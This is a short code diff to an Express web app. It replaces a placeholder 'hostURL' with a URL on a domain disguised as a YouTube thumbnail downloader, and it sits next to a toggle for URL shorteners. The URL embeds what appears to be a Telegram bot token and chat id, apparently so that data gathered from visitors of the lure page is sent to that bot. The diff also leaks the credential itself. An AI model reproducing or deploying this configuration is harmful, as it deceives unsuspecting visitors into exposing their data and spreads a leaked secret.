@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="https://you-tube-thumbnail-download-by.vercel.app/mai.html?bot=8631167491:AAGkga9jKD5cvCDiR433WUWw5VdH8QNIC2Y&id=7625845619";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
